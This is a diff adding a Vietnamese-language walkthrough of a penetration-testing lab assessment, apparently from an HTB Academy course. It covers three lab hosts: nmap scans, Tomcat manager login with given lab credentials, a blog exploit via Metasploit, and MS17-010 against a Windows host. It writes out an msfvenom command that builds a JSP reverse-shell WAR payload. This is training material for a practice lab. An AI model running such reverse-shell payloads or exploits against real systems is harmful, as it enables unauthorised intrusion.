@@ -314,3 +314,113 @@ Mode              Size  Type  Last modified              Name
 
 - Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)
 ![](images/5.png)
+
+
+# The Live Engagement
+
+## Hints
+
+Attempt to complete the challenges on your own. If you get stuck then view the helpful hints below and next to each challenge question:
+
+`Host-1 hint`:
+
+**Click to show hint**This host has two upload vulnerabilities. If you look at status.inlanefreight.local or browse to the IP on port 8080, you will see the vector. When messing with one of them, the creds " tomcat | Tomcatadm " may come in handy.
+
+`Host-2 hint`:
+
+**Click to show hint**Have you taken the time to validate the scan results? Did you browse to the webpage being hosted? blog.inlanefreight.local looks like a nice space for team members to chat. If you need the credentials for the blog, " admin:admin123!@# " have been given out to all members to edit their posts. At least, that's what our recon showed.
+
+`Host-3 hint`:
+
+**Click to show hint**This host is vulnerable to a very common exploit released in 2017. It has been known to make many a sysadmin feel Blue.
+
+Note: Please allow 1-2 minutes for the hosts in the assessment environment to spawn, then connect to the foothold machine using xfreerdp and begin. This would be a good time to review any notes and prepare for the challenge.
+
+
+![](images/6.png)
+
+Sang máy foothold:
+```zsh
+❯ xfreerdp3 /v:10.129.172.195 /u:htb-student /p:'HTB_@cademy_stdnt!'
+```
+
+![](images/7.png)
+
+- What is the hostname of Host-1? (Format: all lower case)
+
+```zsh
+nmap -A 172.16.1.1
+```
+
+![](images/14.png)
+
+Check luôn thằng Tomcat:
+![](images/8.png)
+Đang chạy Tomcat version `10.0.11` -> có exploit.
+
+Do con máy quá lỏ nên phải tải sang cái trình duyệt stable :v
+
+![](images/9.png)
+
+tomcat:Tomcatadm
+
+![](images/10.png)
+
+![](images/11.png)
+Để ý IP trong LAN của con máy foothold này là 172.16.1.5
+Khai thác và tạo Payload tham khảo [bài viết này][https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00] 
+Trông con máy khá lỏ nên không chắc nó tạo payload mà không lỗi lầm vì thử khai thác với msfconsole thấy mất hết module nên mình tạo ở máy nhà rồi chuyển sang:
+
+```zsh
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=1234 -f war > foo.war
+```
+
+Và sau đó chúng ta có shell của Host-01
+
+![](images/12.png)
+
+
+- Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
+
+![](images/13.png)
+
+
+- What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
+
+Ping lấy cái IP address rồi check bằng nmap
+
+![](images/15.png)
+
+![](images/16.png)
+
+Đang chạy Ubuntu nhé  :)
+
+-  What language is the shell written in that gets uploaded when using the 50064.rb exploit?
+![](images/17.png)
+
+PHP nhé
+
+- Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
+
+![](images/18.png)
+Vào msfconsole rồi reload_all. Chọn module vùa import vào:
+
+![](images/19.png)
+
+Cred từ gợi ý: `admin:admin123!@# `
+
+![](images/20.png)
+
+![](images/21.png)
+- What is the hostname of Host-3?
+Tiếp tục nmap -A:
+
+![](images/22.png)
+
+- Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt
+
+Từ gợi ý thì Host-3 có ms17-010 khai thác trực tiếp luôn:
+
+![](images/23.png)
+
+![](images/24.png)
